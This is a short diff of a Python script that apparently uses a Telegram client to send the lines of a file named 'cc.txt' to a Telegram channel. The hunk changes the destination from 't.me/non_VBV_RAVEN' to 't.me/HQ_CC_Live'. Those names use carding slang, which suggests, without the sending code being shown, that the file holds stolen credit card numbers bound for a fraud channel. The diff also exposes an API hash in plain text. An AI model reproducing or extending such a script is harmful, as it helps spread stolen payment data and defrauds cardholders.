@@ -6,7 +6,7 @@ api_hash = '34b4ae3055e20c42951864422e552273'
 done = 0
 total_cc_count = sum(1 for line in open('cc.txt'))
 
-destination = 'https://t.me/non_VBV_RAVEN'  # Replace with the actual group ID or Telegram user ID
+destination = 'https://t.me/HQ_CC_Live'  # Replace with the actual group ID or Telegram user ID
 
 client = TelegramClient('session_name', api_id, api_hash)
 client.start()
